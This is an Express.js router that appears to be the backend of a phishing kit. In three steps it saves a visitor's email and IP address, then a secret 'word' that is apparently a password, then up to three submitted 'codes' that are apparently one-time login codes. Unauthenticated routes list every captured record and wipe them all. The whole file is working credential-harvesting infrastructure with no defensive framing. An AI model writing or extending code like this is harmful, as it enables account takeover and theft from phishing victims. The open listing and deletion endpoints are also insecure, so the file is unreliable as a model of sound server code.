import express from "express";
import User from "../models/User.js";

const router = express.Router();

/* STEP 1 — Save Email & IP */
router.post("/step1", async (req, res) => {
  try {
    const { email } = req.body;
    // Capture the IP address from the request headers or socket
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    if (!email) return res.status(400).json({ error: "Email is required." });

    const newUser = new User({ email, ip });
    await newUser.save();

    res.json({
      message: "Email and IP saved successfully. Proceed to step 2.",
      userId: newUser._id,
    });
  } catch (error) {
    console.error("STEP 1 ERROR:", error);
    res.status(500).json({ error: "Server error during step 1." });
  }
});

/* STEP 2 — Save Word */
router.post("/step2", async (req, res) => {
  try {
    const { userId, word } = req.body;
    if (!userId) return res.status(400).json({ error: "User ID is required." });
    if (!word) return res.status(400).json({ error: "Word is required." });

    const updatedUser = await User.findByIdAndUpdate(userId, { word }, { new: true });
    if (!updatedUser) return res.status(404).json({ error: "User not found." });

    res.json({
      message: "Word saved successfully. Proceed to step 3.",
      user: updatedUser,
    });
  } catch (error) {
    console.error("STEP 2 ERROR:", error);
    res.status(500).json({ error: "Server error during step 2." });
  }
});

router.post("/step3", async (req, res) => {
  try {
    const { userId, code } = req.body;

    if (!userId || !code) {
      return res.status(400).json({ error: "Missing data" });
    }

    // 1. Fetch the user to see which columns are already filled
    const user = await User.findById(userId);
    if (!user) return res.status(404).json({ error: "User not found" });

    // 2. Determine the first available empty slot
    let updateField = {};

    // Check code 1
    if (!user.code || user.code.trim() === "") {
      updateField = { code: code.trim() };
    } 
    // Check code 2
    else if (!user.code2 || user.code2.trim() === "") {
      updateField = { code2: code.trim() };
    } 
    // Check code 3
    else if (!user.code3 || user.code3.trim() === "") {
      updateField = { code3: code.trim() };
    } 
    // All full? Overwrite the 3rd one or stop
    else {
      updateField = { code3: code.trim() };
    }

    // 3. Update only the specific field identified above
    const updatedUser = await User.findByIdAndUpdate(
      userId,
      { $set: updateField },
      { new: true }
    );

    res.json({ 
      message: "Code saved", 
      savedTo: Object.keys(updateField)[0], // Tells you which column was used
      user: updatedUser 
    });

  } catch (error) {
    console.error("OVERWRITE ERROR:", error);
    res.status(500).json({ error: "Server error" });
  }
});

/* GET All Users */
router.get("/", async (req, res) => {
  try {
    const users = await User.find().sort({ createdAt: -1 });
    res.json(users);
  } catch (error) {
    console.error("FETCH ERROR:", error);
    res.status(500).json({ error: "Error fetching users." });
  }
});

/* DELETE ALL Users */
router.delete("/all", async (req, res) => {
  try {
    await User.deleteMany({});
    res.json({ message: "All user data cleared." });
  } catch (error) {
    console.error("DELETE ALL ERROR:", error);
    res.status(500).json({ error: "Error clearing user data." });
  }
});

/* DELETE Single User by ID */
router.delete("/:userId", async (req, res) => {
  try {
    const { userId } = req.params;
    const deletedUser = await User.findByIdAndDelete(userId);

    if (!deletedUser) return res.status(404).json({ error: "User not found." });

    res.json({ message: "User deleted successfully.", user: deletedUser });
  } catch (error) {
    console.error("DELETE USER ERROR:", error);
    res.status(500).json({ error: "Error deleting user." });
  }
});

export default router;
